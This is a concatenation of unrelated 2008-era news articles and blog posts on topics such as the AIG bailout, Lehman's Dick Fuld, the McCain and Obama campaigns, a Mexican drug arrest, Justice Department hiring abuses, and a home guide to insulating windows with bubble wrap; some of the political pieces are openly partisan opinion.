We 've already likened AIG to a money black hole -- you throw the cash in there and it disappears for good , never to be seen or heard from again .
The NYT tries to figure out where , exactly , all that cash is going , but the fact that they can't come to any sort of definitive answer is telling
“ You do n’t just suddenly lose $ 120 billion overnight , ” said Donn Vickrey of Gradient Analytics , an independent securities research firm in Scottsdale , Ariz .
Mr. Vickrey says he believes A.I.G. must have already accumulated tens of billions of dollars worth of losses by mid-September , when it came close to collapse and received an $ 85 billion emergency line of credit by the Fed .
That loan was later supplemented by a $ 38 billion lending facility .
Seems like a pretty good theory .
We may get a more definitive answer next week :
A.I.G. has declined to provide a detailed account of how it has used the Fed ’s money .
The company said it could not provide more information ahead of its quarterly report , expected next week , the first under new management .
The Fed releases a weekly figure , most recently showing that $ 90 billion of the $ 123 billion available has been drawn down .
A.I.G. has outlined only broad categories : some is being used to shore up its securities - lending program , some to make good on its guaranteed investment contracts , some to pay for day - to - day operations and — of perhaps greatest interest to watchdogs — tens of billions of dollars to post collateral with other financial institutions , as required by A.I.G. ’s many derivatives contracts .

AIG Is A Fracking Black Hole
“ Do you want to punch Dick Fuld in the nose ? ”
In the wake of today ’s column , I did an interview this morning on WNYC , and that was the question the host , Brian Lehrer , was asking his listeners .
I can certainly understand the feeling .
Yesterday , during his testimony before Henry Waxman ’s House Committee on J’Accuse ( O.K. , O.K. : the House Committee on Oversight and Government Reform ) , Mr. Fuld came across as a cold , arrogant man who was playing that classic American tune , “ I ’m a Victim Too . ”
It was n’t pretty .
When he tried to play down the enormous sums he has put in his pocket these past years , he sounded out of touch with the pain that Lehman ’s bankruptcy has caused thousands of employees and shareholders .
I also could n’t help thinking back to Jeff Skilling ’s testimony before Mr. Waxman six years ago , after the Enron scandal unfolded .
Mr. Fuld was less combative than Mr. Skilling , but the impulse to place the blame on rumor - mongering short - sellers was the same , as was the unwillingness to acknowledge mistakes .
Also , like Mr. Skilling , Mr. Fuld has become the most recognizable villain to most Americans — hence Mr. Lehrer ’s question — and prosecutors are surely going to be digging around Lehman ’s collapse , looking for criminal acts , just as they did after Enron .
It does n’t help Mr. Fuld that his firm was clearly telling the markets that everything was fine when it clearly was n’t .
As you may recall , that is one of the reasons Mr. Skilling ended where he is now — behind bars .
But let ’s be honest here .
Every firm on Wall Street — and every C.E.O. — did the same things that Mr. Fuld did , and rewarded themselves every bit as handsomely .
Stan O’Neal at Merrill Lynch made the exact same set of mistakes — diving into the subprime derivative market with both feet .
All the firms gamed the ratings agencies to get Triple - A ratings for their toxic junk .
They all pushed for higher debt ratios .
( There is a lovely memo floating around the Internet , written by Henry Paulson when he was chief executive of Goldman Sachs , in which he says that Goldman ’s chief regulatory priority is to get the S.E.C. to loosen up debt ratios for the big investment banks . )
If Lehman had managed to sell itself to Bank of America — and Merrill had gone bankrupt instead — it would be Mr. O’Neal who would now be playing the role of Henry Waxman ’s punching bag .
I ’m not saying that the urge to punch Dick Fuld in the nose is n’t a powerful one .
I am saying that it is a little misplaced .
The best efforts of everyone — including Mr. Waxman — should be geared toward solving the crisis , better understanding why it happened , and making sure it can never happen again .
Then we can turn our attention to the likes of Dick Fuld .
Dave Barton is known for directing bloody , violent , sexually explicit " in yer face " plays .
Given that he was a Christian fundamentalist who began questioning those teachings and became a gay activist with ACT - UP , it 's not surprising that the Rude Guerrilla Theater Company 's artistic director and members of his troupe would weigh in against Prop.
8 , the initiative to overturn California 's recent recognition of same - sex marriages .
What might surprise some is the reverent and tender approach Barton takes in directing " Love Poem , " a two - minute video urging a " no " vote that would preserve gay marriage .
The text is from the New Testament -- Chapter 13 of the apostle Paul 's first letter to the Corinthians -- delivered in multiple voices by more than 15 members and supporters of Rude Guerrilla .
The unspoken irony is that some of Paul 's other writings have formed the basis for religious arguments that homosexuality is sinful and gay marriage wrong .

When scientists discovered that bacteria , not stress , caused most stomach ulcers , the insight overturned a century of medical dogma , transformed clinical practice and garnered a 2005 Nobel Prize for the two researchers who made the connection so many others had missed .
After people adopted antibiotics to treat gastric distress , though , microbiologist Martin Blaser and his colleagues at New York University began to document an odd medical trend .
Ulcers did drop dramatically , as expected .
So did the incidence of stomach cancer ....
The political convention is kind of a bust for downtown strip clubs , but techies in town for next week ’s electronics show should give the clubs a boost , one exotic dancer said .
Michelle Horning , a dancer at La Boheme , said business is slower this week than normal because there is a big lull in customers in the evenings during the political speeches .
She said last week was good when politicians ’ advance teams were in town ahead of the convention .
The Custom Electronic Design and Installation Association show hits the Colorado Convention Center starting Wednesday .
“ If the DNC is a bust , then the CEDIA will pick us up , ” Horning said .
Business at another club , the Diamond Cabaret , has remained steady , employees said , despite several road closures due to protests that shut off the club ’s valet parking .
Horning said exotic dancers from across the country , expecting large crowds because of the Democratic National Convention , contacted La Boheme in the past several weeks hoping to dance this week .
Management turned them down , however , opting to let the club ’s more tenured dancers take the stage .
Dancers and servers at the club are still hoping visiting Democrats will drop some cash at La Boheme , though .
“ It ’s just been mediocre .
At the end of the week , it will be better , ” Horning said .
Mexican authorities said Wednesday that they arrested a leading drug figure known as El Rey after a shootout in Mexico City early this week .
Jesus Zambada Garcia , the brother of a suspected drug kingpin in the western state of Sinaloa , was among 16 people captured Monday , Atty .
Gen. Eduardo Medina Mora said .
The attorney general said Zambada , whose nickname means “ the king , ” commanded one of four branches of the so - called Sinaloa cartel , leading its operations in central Mexico .
Zambada is the brother of Ismael Zambada and an associate of Joaquin “ Shorty ” Guzman , the most - wanted trafficker in Mexico , officials said .
Jesus Zambada controlled smuggling of cocaine and chemical ingredients for the production of methamphetamine through Mexico City ’s airport , Medina Mora said .
Authorities have focused attention in recent months on drug smugglers ’ use of the country ’s largest airport .

Zambada has also been linked to gruesome drug killings in central and western Mexico , prosecutors said .
“ The arrest of Jesus Zambada Garcia , the King , stands out , without a doubt , as one of the most significant by President [ Felipe ] Calderon ’s government to date , ” Medina Mora told reporters .
“ It is not the only one in recent months , nor will it be the last in the months to come . ”
Investigators are looking into Zambada ’s possible role in the assassination of acting federal Police Chief Edgar Millan Gomez .
The police commander was ambushed in May by a gunman in his Mexico City home , and authorities have long suspected that Sinaloa cartel traffickers were behind the slaying .
Marisela Morales , who runs the organized - crime unit of the attorney general ’s office , called Zambada “ one of the most important ” smugglers of cocaine and methamphetamines into Mexico .

Zambada ’s arrest offered officials a much - needed chance to claim progress in their uphill battle against drug traffickers .
Calderon declared a crackdown nearly two years ago , but drug - related violence has worsened despite some high - profile arrests and hefty drug seizures .
The death toll this year has exceeded 3,500 , according to unofficial tallies in the media , amid a wave of killings that has included decapitations , scorched bodies and a growing list of innocent victims .
A grenade attack that killed eight civilians last month in the western state of Michoacan fed an increasing sense among Mexicans that their government is losing its war with well - armed drug gangs .

In Monday ’s incident , police came under fire after being led to a house in northern Mexico City by a resident ’s tip .
Police rounded up the 16 suspects but were not able to immediately confirm Zambada ’s identity , Morales said .
Prosecutors said Zambada ’s 21 - year - old son , Jesus Zambada Reyes , and a nephew were among those arrested .
On Wednesday , authorities lined up suspects and their seized weapons before news cameras , and police searched the house where the shootout took place .
U.S. Secretary of State Condoleezza Rice on Wednesday began a two - day visit with Mexican officials in the resort city of Puerto Vallarta that was to include discussion of Mexico ’s battle against traffickers .

Mexican officials are eager for the release of a $ 400 - million package of U.S. training and equipment , known as the Merida Initiative .
The aid , approved by Congress in June , is the first part of a three - year assistance package for Mexico , Central America and the Caribbean .
In voting for the aid , Congress softened human rights prerequisites that had raised the hackles of Mexican officials .
Lawmakers had attached the requirements to ensure that the aid would not be used to repress ordinary Mexicans or fall into the hands of corrupt authorities .
The two nations must reach agreement on final details of the assistance before it is delivered .

I spent most of this weekend at a family celebration .
So it was only this evening that I got a chance to see Colin Powell ’s statement at the beginning of Meet the Press this morning , which you can see here …
And what struck me was that Powell ’s rationale for supporting Obama tracked very closely with some of the harshest critics of Sen.
McCain , despite the fact that he used less cutting words to express them .
There were three key points he hit .
First , he questioned McCain ’s unsteady and erratic response to the economic crisis .
He did n’t use the word ‘ erratic ‘ but he might as well have .
McCain was “ unsure ” , “ almost everyday there was a different approach to the problem , ” he “ did n’t have a complete grasp of the economic problems . ”
In contrast , Obama had “ steadiness ” amidst the crisis .
Second , he questioned McCain ’s “ judgment ” , particularly but it would seem not exclusively in his decision to pick Sarah Palin as his running mate , someone Powell said was unqualified to serve as president .
Third , he said he was “ disappointed ” in McCain ’s sleazy campaign tactics .
Yes , ‘ sleazy ’ is my word .
But Powell ’s own words were pretty clear — he was talking about McCain ’s campaign of distortion and innuendo aimed at painting Obama as a crypto-Muslim and terrorist .
It “ goes too far ” , said Powell , in something of an understatement .
It ’s quite a blow for McCain on each point .
But the most galling must be what Powell said about his judgment , his steadiness in moment ’s of crisis .
Powell and McCain are both in their early 70s .
Obama is a quarter century younger .
And in so many words Powell said that compared to Obama , McCain simply lacks the seasoning , the maturity to be president .
I recall McCain reaping a harvest of media coverage when he wormed out of having to appear on that first deadly day of the GOP Hate Fest in St. Paul and instead claimed to be saving New Orleans from Hurricane Gustav .
His entirely passive attitude towards the far more deadly and destructive Hurricane Ike showed , once again what a shameless manipulator of the media he is .
But today 's stunt beats everything .
Not having shown up at the Senate since early April -- and having none virtually no Senate work for over a year -- McCain , viewed his cascading poll numbers this morning and started running around screeching that the sky is falling .
The Palin stunt had run its course and he needed some new shiny object .
And that was ... canceling the presidential debate scheduled for Friday .
Clearly facing Barack Obama , someone capable of thinking on his feet and not talking in memorized soundbytes was something he was looking forward to as much as he was looking forward to appearing with George Bush ( approval rating 19 % ) in St , Paul .
His sudden concern for New Orleans weather saved him from Bush and he hoped that his just as sudden concern for Senate business would save him from a debate he never wanted to have and , with good cause , fears greatly .
Voters were stunned -- and sickened by another cheap McCain campaign ploy .
When asked in an MSNBC poll whether they agreed with McCain that the debate should be postponed , 70.7 % strongly disagreed ( with another 9.2 % agreeing ) .
The number who agreed with McCain wasto George Bush 's current approval rating ( exactly 19 % ) .
As you can see on the CNN.com Quick Vote , 71 % of voters think McCain 's announcement is " a political gimmick " and 24 % see it as an actual effort to help the economy .
Newt Gingrich sees it as an opportunity for Republican incumbents to worm out of debates and is urging congressional candidates to follow McCain 's lead , something many have been doing anyway , trying their best to avoid answering embarrassing questions about rubber stamp voting records and huge " donations " from Big Oil and Big Banks followed by votes that clearly helped Big Oil and Big Banks and hurt average Americans -- and average American voters .
Virginia wingnut Virgil Goode was , predictably , the first to jump in , already announcing he'd be ducking a debate at Hampden - Sydney College with a far sharper and more knowledgeable opponent , Tom Perriello .
Tom 's campaign spokesperson pointed out this evening that " Goode has participated in the Hampden - Sydney debate in every past election cycle .
Why is he afraid to debate all of a sudden ?
He said yesterday that he 's letting the lobbyists work on the bailout bill , so he certainly can't be ' suspending ' his campaign to confront that issue .
He has no credible excuse for ducking this debate .
His constituents -- especially those in Farmville who do not have access to the Roanoke - Lynchburg and Charlottesville news markets -- deserve the opportunity to see both candidates debate the issues so they can make an informed choice in November .
Mr. Goode does not own this seat ; he has to earn it . "
Illinois Senator Dick Durbin saw right through the cynical move by McCain and the Republican hacks who are following his lead -- watch Randy Kuhl ( R - NY ) be the next to announce no debates .
" Last week , " pointed out Durbin , " Senator John McCain declared the fundamentals of our economy ' strong . '
Today he says the situation is so dire he needs to suspend his campaign and delay a scheduled Presidential debate so he can devote his full attention to the problem .
With polls showing his campaign is at its weakest , Senator McCain 's decision may have less to do with the drop in the Dow Jones average and more to do with a decline in the Gallup poll .
It 's not economic leadership that Senator McCain would bring to these negotiations ; it 's presidential politics -- which is the last thing we need if we really want to solve the serious problems our nation faces .
" Even conservative Republican commentator George Will noted what a phony McCain is on the economic crisis .
" Conservatives who insist that electing McCain is crucial usually start , and increasingly end , by saying he would make excellent judicial selections .
But the more one sees of his impulsive , intensely personal reactions to people and events , the less confidence one has that he would select judges by calm reflection and clear principles , having neither patience nor aptitude for either .
It is arguable that , because of his inexperience , Obama is not ready for the presidency .
It is arguable that McCain , because of his boiling moralism and bottomless reservoir of certitudes , is not suited to the presidency .
Unreadiness can be corrected , although perhaps at great cost , by experience .
Can a dismaying temperament be fixed ?
" Will has a good point .
Americans want someone with a steady hand , who keeps his cool in a crisis , not someone who runs around screaming " the sky is falling " when it suits his own narrow interest .
Obama is looking at McCain as though he were insane and rebuffed his efforts to duck the debate .
" This , " he said , " is exactly the time when people need to hear from the candidates ...
Part of the president ’s job is to deal with more than one thing at once .
In my mind it ’s more important than ever . ”
Instant polling shows that only 10 % of Americans agree with McCain .
Even Fox News shows McCain 's polling numbers back in the 30's , where he was before the Palin stunt .
( On a related note , the only newspaper to still take Sarah Palin seriously , thedared McCain to follow through with his threat to sue them by revealing the name of her secret lover ( Brad Hanson , unfortunately , not ofHansons ) .

( CNN ) -- A $ 10 million call by Google Inc. for beneficial , world - changing ideas has generated more than 150,000 online submissions .
More than 150,000 people have submitted ideas they hope will benefit the world -- and be funded by Google .
The deadline for people to submit ideas for the initiative , called Project 10^100 , was Monday .
Google employees will now sift through the ideas , submitted in 25 languages , and choose 100 semifinalists by January 27 .
Funding for up to five winning ideas will be awarded in May .
" We 're thrilled by the large array of enthusiastic responses to Project 10^100 .
That number has exceeded our expectations , " said Bethany Poole , a product marketing manager at Google .
" We 're also very impressed by the variety and ingenuity of the submissions across all categories , ranging from health to energy , education and the environment , " she said .
Google launched the ambitious project September 24 to help celebrate its 10th birthday .
In announcing Project 10^100 ( pronounced " 10 to the 100th " ) , the Internet giant said to hoped to solicit and bankroll fresh ideas it believes will have broad and beneficial effects on people 's lives .
The project 's Web site ( http://www.project10tothe100.com/) suggested that successful ideas address such critical issues as providing food and shelter , building communities , improving health , granting more access to education , sustaining the global ecosystem and promoting clean energy .
As an example , Google cited the invention of the Hippo Water Roller , a barrel - shaped container that holds 24 gallons and can be rolled with little effort like a wheelbarrow , making it easier for African villagers on foot to transport critically needed fresh water to their homes .
Over the past month , the Google project 's Web site received more than 2.5 million unique visitors , and its video was watched more than a million times .
Entrants had to briefly describe their idea and answer six questions , including , " If your idea were to become a reality , who would benefit the most and how ? "
Now comes the hard part .
More than 3,000 Google employees from more than 50 offices worldwide , with the help of an advisory board , will whittle down the massive list to 100 finalists .
" We will be going through the database and judging the ideas based on their reach , depth , attainability , efficiency and longevity , " Poole said .
On January 27 , Google will make the top 100 ideas available online for public voting for one week .
A panel of as - yet - unnamed judges will then review the top 20 ideas and announce up to five winners in mid-February .
Funding , from a pool of $ 10 million , will be awarded in May .
If the judges decide to reward five winning ideas , each will receive $ 2 million .
If only two ideas are chosen , each will receive $ 5 million , and so on .

SEATTLE
Two years ago , a list of the nation ’s brainiest cities was put together from Census Bureau reports  that is , cities with the highest percentage of college graduates , which is not the same as smart , of course .
These are vibrant , prosperous places where a knowledge economy and cool things to do after hours attract people from all over the country .
Among the top 10 , only two of those metro areas 
Raleigh , N.C. , and Lexington , Ky.  voted Republican in the 2004 presidential election .
This year , all 10 are likely to go Democratic .
What ’s more , with Colorado , New Hampshire and Virginia now trending blue , Republicans stand to lose the nation ’s 10 best - educated states as well .
It would be easy to say these places are not the real America , in the peculiar us - and - them parlance of Sarah Palin .
It ’s easy to say because Republicans have been insinuating for years now that some of the brightest , most productive communities in the United States are fake American  a tactic that dates to Newt Gingrich ’s reign in the capitol .
Bubble Wrap Window Insulation
I 've used bubble wrap on windows for two three + years now , and I 'm amazed how quick and easy it is .
This year , we are even covering the windows in the guest room -- we just take the bubble wrap down when guests come , and put it back up when they leave -- 15 seconds a window .
This is a simple technique for insulating windows with bubble wrap packing material .
Bubble wrap is often used to insulate greenhouse windows in the winter , but it also seems to work fine for windows in the house .
You can use it with or without regular or insulating window shades .
It also works for windows of irregular shape , which can be difficult to find insulating shades for .
Its been five years since I put this page up , and I 've heard from MANY people who are quite happy with using bubble wrap for window insulation .
The view through the bubble wrapped window is fuzzy , so do n't use it on windows where you need a clear view .
But , it does let plenty of light through .
I know you came here to look at bubble wrap for your windows , but our site also has literally hundreds of good practical projects and ideas on energy efficiency , solar heating and electricity , and the Half Plan to help you cut your total energy use in half .
Have a look around .
I like the medium to large size bubbles .
The larger ones appear ( from surface temperature measurements ) to insulate a little better , and you still get a nice artistic effect looking out of them .
The small bubble warp totally obscures the view , but you still get light .
Most people seem to prefer the large bubble version .
Nov 10 , 2013 -- added a Comments and Suggestions section ...
Installation
Cut the bubble wrap to the size of the window pane with scissors .
Spray a film of water on the window using a spray bottle .
Apply the bubble wrap while the window is still wet and press it into place .
The bubble side goes toward the glass .
To remove the bubble wrap , just pull it off starting from a corner .
You can save it and use it for several years .
It does not leave a mess or stains on the window glass .
If you have trouble with the bubble wrap separating from the window when the film dries , you can try adding a little Glycerin to the water , but this probably wo n't be necessary .
A few small pieces of double back tape can be helpful on really stubborn windows .
The bubblewrap can be installed in the fall , and removed in the spring .
Judging by how mine looks after a year , it may last quite a while .
When you take the bubble wrap down , put a small number in on the upper right corner of each piece of bubble wrap , and write down which window that number goes with on a piece of paper .
Save the paper for the installation next fall .
This tells you instantly where each sheet goes , and which way its oriented .
Some places to get bubble wrap :
- Save up bubble wrap packing material that you and friends receive - Check places that sell larger items like canoes or furniture -- bubble wrap is often used for packing these .
- Check for wholesale suppliers of packing material in your area -- these places will often sell a roll to the public .
-
Here is one potential online source : http://www.uboxes.com
( I 've not actually tried them , but looks OK ) -
As a last resort , places like the UPS store have it , but the prices are usually high .
.
Suggestion from Pat :
" Bubble wrap small bubble and large can be had for free by contacting furniture retailers or rental shops .
They throw it away by the tons ! "
I 've heard the same thing for places that sell canoes .

Double Bubble ( added Nov 15 , 2007 )
I thought it might be worth a try to see if two layers of bubble wrap might be used .
This may be going a bit far , but it does seem to work .
I applied a 2nd layer of bubble wrap over the first layer in exactly the same way as the first layer was applied to the window glass .
That is , spray the first layer of bubble wrap with water mist , and while its still wet apply the 2nd layer of bubble wrap to it and smooth it out .
For both layers , the bubble side face the glass .
It has been a couple days since I did this , and it is staying in place OK -- not sure if it will stay up with the added weight in the long term or not .
The two layers of bubble wrap fuzzy the view a bit more than one layer , but it still seems to transmit quite a bit of light .
The surface temperature on the 2nd layer is higher than the surface temperature on the first layer , so it is adding some insulation value .

Blue tape is to take temperature readings on with the IR thermometer .
Payoff
The bubble wrap has a short payback in cold climates .
About 2 months for single glazed windows , and half a heating season for double glazed widows .
Details on payback :
For an 7000 deg - day climate ( northern US ) , and single glazed windows , the bubble wrap increases the R value from about R1 to about R2 .
This cuts the heat loss from the window in half .
Heat losses with and without bubble wrap for 1 sqft of window are :
Heat loss w/o wrap = ( 7000 deg-day ) ( 1 ft ^2 ) ( 24 hr/day ) / ( 1 ft^2-F/BTU ) = 168K BTU per season
Heat loss with wrap = ( 7000 deg-day ) ( 1 ft ^2 ) ( 24 hr/day ) / ( 2 ft^2-F/ BTU ) = 88 K BTU per season
If you are heating with natural gas at $ 1.50 per therm ( 100 CF ) in an 80 % efficient furnace , then the saving for 1 sqft of wrap for the season is : Saving per sqft = ( $ 1.50 ) ( 168 K - 88 K ) / ( 100K * 0.8 ) =
$ 1.65 per season per sqft of window
The bubble wrap cost about $ 0.30 per sqft , so the payback period is about 2 months -- not too bad !
If you repeat the numbers above for double glazed windows , the saving is $ 0.60 per sqft per season , and the payback period is a about one half heating season .
If you use a more expensive fuel like propane , fuel oil , or electricity , the savings will be correspondingly more .

Here is my Rough Performance Test
Some interesting work done by students at LIU on insulation value of packing materials .
Probably not exactly applicable to windows , but interesting .
Does Bubble Wrap Help
In the Summer ? ( added March 2016 )
There have been a few questions on whether bubble wrap is effective in reducing unwanted heat gain in the summer .
The answer is that it does help some , but there are probably better approaches .
The bubble wrap adds insulation , so just as this added insulation helps to reduce heat loss from the warm room to the cold outside in the winter , it also helps to reduce heat gain from the hot outside to the cool room in the summer , and that is good and helps the room run cooler .
But , heat gain also comes from the sun shining right through the window and the bubble wrap and then being absorbed when it hits a surface in the room .
In the winter , this direct absorption of solar radiation is a good thing in that its free heat gain -- its one of the nice features of bubble wrap that it allows the sun to shine right through it and get beneficially absorbed in the room .
But , in the summer this direct absorbtion of solar radiation in the room is a negative and its a big part of summer heat gain for windows that get a lot of direct sun .
For summer heat gain with windows that get direct sunlight its really important to prevent the sunlight from shinning through the window and into the room .
The best way to do this is to stop the sunlight outside the window by shading the window on the outside in some way .
The shading can be things like shade trees or bushes , shade screen ( which still allows some light into the room , but blocks most of the heat gain ) , or completely opaque shades on the outside of the window that block all of the sun .
If its not possible to shade the window on the outside , than another approach is to place a reflective surface ( like a shade ) just inside of the window with the reflective side facing the window .
This reflects much of the sun right back out the window so it is not absorbed and converted to heat inside the room .
Surfaces like aluminum foil or a reflective white paint are good at reflecting sunlight back out the window .
The section on passive cooling has a lot of ideas and schemes for reducing summer heat gain .
The window shading page in particular has ways to reduce heat gain through windows .
Bubble Wrap Life :
Doug reports that bubble wrap that he installed 6 years ago has about had it .
He thinks the life is around 5 to 7 years .
In his application , the bubble wrap stays up year round .
He reports that at the end of its life , it tends to stick to the glass , so replacing it before this happens might save some cleanup work .
The bubble wrap he is using was intended for packaging , so this still leaves open the question of whether the bubble wrap intended for greenhouses will last longer .
The greenhouse bubble wrap we installed is on its third winter , and is still doing fine .

LOS ANGELES ( Hollywood Reporter ) - Batman wants an Oscar .
To be precise , Warner Bros. wants a statuette -- or 10 -- for “ The Dark Knight ” .
So the studio plans to re-release its blockbuster Batman sequel in January , the height of Academy Awards voting season .
“ It ’s just a matter of bringing it back as a reminder for people , ” a studio insider explained .
Warner Bros. domestic distribution president Dan Fellman acknowledged ongoing talks with Imax execs over the prospect of restoring the Christian Bale starrer to some giant - screen venues in January .
It ’s uncertain if “ Dark Knight ” also will reappear in conventional venues at that point .
Directed by Christopher Nolan , the film ’s huge commercial and critical success has spurred talk of possible Oscar nominations for its director , producers and cast -- most specifically Bale ’s co-star , Heath Ledger , for the late actor ’s edgy performance as the Joker .
To date , “ Dark Knight ” has rung up about $ 512 million domestically and $ 440 million internationally , including more than $ 55 million in Imax grosses .
A pre-Oscars re-release would help assure its topping $ 1 billion worldwide .
But with the title set to hit DVD in December , it ’s now apparent anyone hoping the Batman sequel would soar to “ Titanic ” heights will be disappointed .
“ Dark Knight ” already ranks as the second - highest - grossing movie ever , after “ Titanic ’s ” phenomenal $ 1.84 billion -- a mix of $ 600.8 million in domestic box office and $ 1.24 billion in foreign coin registered in 1997 and 1998 .

When Bush administration officials at the Justice Department dismissed nine U.S. attorneys in 2006 , there were various theories as to why the prosecutors were being let go .
They were too soft on the death penalty .
They did not prosecute enough illegal immigrants .
They did not go after enough Democrats .
On Monday , the Justice Department ’s internal watchdog hinted at perhaps the most sensational justification yet -- perceived homosexuality .
In the second of a series of reports on the politically charged tenure of former Atty .
Gen. Alberto R. Gonzales , the department ’s inspector general found that two former Justice aides used sexual orientation as a litmus test in deciding whom they would hire or fire .
Advertisement
The report describes an alleged “ sexual relationship ” between a career prosecutor and a U.S. attorney , who were not named .
Margaret M. Chiara , the former U.S. attorney in Grand Rapids , Mich. , said in an interview with The Times that she now believed she was fired because of the erroneous belief that she was having a relationship with career prosecutor Leslie Hagen .
“ I could not begin to understand how I found myself sharing the misfortune of my former colleagues , ” Chiara said of the eight other U.S. attorneys who were fired .
“ Now I understand . ”
Justice officials said after her firing that Chiara was let go because of mismanagement and because she had caused morale in her office to sink .
Chiara said Monday she believed those concerns were raised by the same people who spread rumors about her and Hagen .
“ I guess now I am persuaded with deep regret that this is what was the basis , ” she added .
“ There is nothing else . ”

The investigators found that Hagen lost a coveted assignment in Washington after rumors of the supposed relationship reached Gonzales aide Monica M. Goodling .
Chiara and Hagen told investigators that they did not have a sexual relationship , according to the report .
Lawyers for Goodling declined to comment .
The report released Monday provides a more detailed examination of questionable moves made by Goodling and others -- including Gonzales ’ former chief of staff , D. Kyle Sampson -- that were revealed during congressional hearings last year .
A former public affairs officer who became the Justice Department ’s liaison with the White House , Goodling testified under a grant of immunity before the House Judiciary Committee that she had “ crossed a line ” and allowed political and other impermissible factors to affect her hiring decisions .

The latest disclosures include a finding that Goodling rejected the application of a career terrorism prosecutor for a job at Justice Department headquarters because his wife was active in local Democratic politics .
The report said a less - qualified candidate was hired .
Goodling also sought out the advice of the White House and other Republicans in filling vacant immigration judge positions .
Goodling -- who declined to be interviewed by the authors of the report -- previously testified that , based on advice from Sampson , she incorrectly had believed that it was legal to consider political factors in selecting judges .
The report found that Gonzales was unaware of many of the hiring decisions , and took action when he realized there were problems .
Gonzales ’ lawyer , George J. Terwilliger III , said Monday that the report was a measure of vindication for the former attorney general .

Atty . Gen. Michael B. Mukasey said in a statement that he was “ of course disturbed ” by the findings , and noted that the department had taken action to head off future abuses .
A spokeswoman for Glenn A. Fine , the Justice Department inspector general , declined to comment when asked why the report did not address whether Goodling had retaliated against Chiara as well as Hagen .
The office is preparing a separate report on the firings of the nine U.S. attorneys , and some observers speculated that the circumstances surrounding the dismissal of Chiara may be addressed there .
Hagen was hired by Chiara in Grand Rapids about a year after Chiara was appointed by President Bush to lead the U.S. attorney ’s office in western Michigan .
The women had known each other since they were county prosecutors together in the 1990s .
After Hagen joined the U.S. attorney ’s office , the women would often commute together to work .

Hagen was hired to focus on crimes affecting Native Americans -- a priority of Chiara ’s -- and she was successful , winning an award from the director of the administrative office in Washington overseeing U.S. attorneys .
The report does not address how the rumors about sexual orientation began .
The report also says there were rumors that the women “ took government trips together ” and that Hagen “ received large bonuses . ”
But it found that allegations about the supposed financial benefits were never investigated or referred for investigation , and thus remained unsubstantiated .
Lisa Banks ,
Hagen ’s attorney , said Monday that all of the allegations were untrue .
“ This rumor of a relationship between [ Hagen and Chiara ] is absolutely false .
There was no such relationship , no improper trips or bonuses .
It was completely fabricated , based on nothing but malicious rumor , ” Banks told The Times .
Advertisement
Banks said she believed the rumors were started by other attorneys in the Grand Rapids office who eventually landed jobs at the Justice Department in Washington .
She declined to identify them .
“ Leslie was a stellar performer .
She earned a coveted award .
It engineered some jealously .
Because she was doing well , and because she was a colleague and friend of the U.S. attorney , I think that is probably where these rumors started , ” Banks said .
“ Once they were heard by Monica Goodling . . . that was the end of Ms. Hagen and her career . ”
After working in Grand Rapids , Hagen was reassigned in 2005 to the Justice Department in Washington to work on Native American issues and was offered a customary extension by her supervisors after a year on the job .
Goodling intervened and blocked the extension .
The report said that several witnesses told investigators that her opposition was based on the “ alleged sexual orientation . ”
Advertisement
One official told investigators about a conversation in which he told Goodling that he had heard the rumors that the women were lesbians .
He said Goodling responded to that news “ by putting her head in her hands and asking why no one had told her about this information before . ”
Monday ’s report also said that Goodling used an Internet search that included the words “ gay ” and “ homosexual ” to screen candidates and their backgrounds .
Investigators found that Goodling used the same search parameters as Jan Williams , who served as White House liaison before Goodling .
The report said that Williams had used the string in late 2005 and early 2006 to research candidates for positions on a national advisory commission on violence against women .
Since being dismissed , Chiara , 64 , has been serving on a national commission investigating sexual violence in prisons .
Hagen , 44 , has been working in a Justice Department office that oversees grant programs regarding sex offender registration and notification .

Lawyers for Goodling released a statement saying that her testimony before Congress had brought to light many of the abuses included in Monday ’s report .
They described the testimony as “ among the most candid and meticulous that has been seen on Capitol Hill in decades . ”

Advertisement John McCain has accepted the Republican Party 's candidacy for the White House in a speech to cheering supporters at the party 's national convention .
He vowed to bring change to government , restore the people 's trust in the party and to fight for a better nation .
Praising his running mate Sarah Palin , he said she was the right person to help him bring change to Washington .
The Arizona senator said he respected Democratic rival Barack Obama and would seek a bipartisan approach to politics .
Presenting himself once again as a maverick , he pledged to fight corruption , whether Democratic or Republican , and make sure that he worked for the good of the American people .
" Let me offer an advance warning to the old , big spending , do nothing , me first , country second Washington crowd : change is coming , " Mr McCain told the crowds in St Paul , Minnesota .
Again and again , I 've worked with members of both parties to fix problems that need to be fixed

In a criticism of his own party , he said he would " fight to restore the pride and principles " of the party , damaged after some Republicans gave in to " the temptations of corruption " .
" We 're going to recover the people 's trust by standing up again for the values Americans admire , " he said .
" The party of Lincoln , Roosevelt and Reagan is going to get back to basics . "
Mr McCain then turned to attacking the Democrats over taxes and spending , saying they would seek to raise taxes whereas he would keep them low and cut them where possible .
Going into some policy specifics , he pledged create new jobs , improve education and to reduce a " dangerous dependence on foreign oil " by producing more energy at home , including by drilling new offshore oil wells .
Mr McCain promised to take a bipartisan approach to resolving the nation 's problems , saying : " Again and again , I 've worked with members of both parties to fix problems that need to be fixed .
McCAIN'S MOST - USED WORDS
Full text of McCain speech US media mixed over speech " That 's how I will govern as president .
I will reach out my hand to anyone to help me get this country moving again .
" I have that record and the scars to prove it .
Barack Obama does not . "
After speaking of the five years he spent as a prisoner of war in Vietnam and how that experience had inspired his love of his country , he called on his fellow Americans to fight with him to make it a better one .
" Stand up , stand up , stand up and fight .
Nothing is inevitable here .
We 're Americans and we never give up .
We never quit .
We never hide from history .
We make history . "
The almost hour - long speech , which ended in the traditional shower of confetti and red , white and blue balloons , brought to a close the party 's four - day event .
' Tested and true '
The BBC's Adam Brookes in St Paul says Mr McCain 's speech was measured and entirely lacking in the sarcasm and vitriol which have been levelled at Mr Obama over the past couple of nights .
He said he hated war and would use all America 's tools - diplomatic , military and economic - to build what he called a stable and enduring peace , as well as shaking up Washington and including Democrats and independents in a McCain administration .
Mrs McCain praised her husband as a great father and devoted American
It was all a rather different tone to the Republican politics of the past eight years , and to many of the other speakers at this Republican convention , our correspondent says .
There was very little of President George W Bush in this speech , our correspondent adds , as Mr McCain tries to show that he is his own man and can signify a break with the Bush years .
Mr McCain 's wife , Cindy , in her speech praised her husband 's family values , strength of character , war service and leadership .
" If Americans want straight talk and the plain truth , they should take a good close look at John McCain ... a man tested and true , who 's never wavered in his devotion to our country , " she said , after arriving on stage flanked by their seven children .
Her speech followed the convention 's formal nomination of Mrs Palin - the Republican Party 's first female vice - presidential candidate .
